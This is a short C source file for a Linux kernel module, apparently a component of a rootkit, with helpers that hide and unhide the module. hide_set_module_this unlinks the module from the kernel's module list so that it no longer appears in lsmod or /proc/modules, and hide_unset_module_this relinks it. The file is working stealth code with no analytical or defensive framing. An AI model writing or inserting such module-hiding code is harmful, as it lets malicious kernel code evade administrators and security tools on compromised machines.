#include <linux/module.h>
#include <linux/list.h>

#include <hide.h>
#include <hook.h>

static struct list_head *this_module_prev;

void hide_set_module_this(void)
{
    // only set if previously unset
    if (this_module_prev)
        return;
    // save prev module so we can re-add
    this_module_prev = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void hide_unset_module_this(void)
{
    // only unset if previously set
    if (!this_module_prev)
        return;
    list_add(&THIS_MODULE->list, this_module_prev);
    this_module_prev = NULL;
}
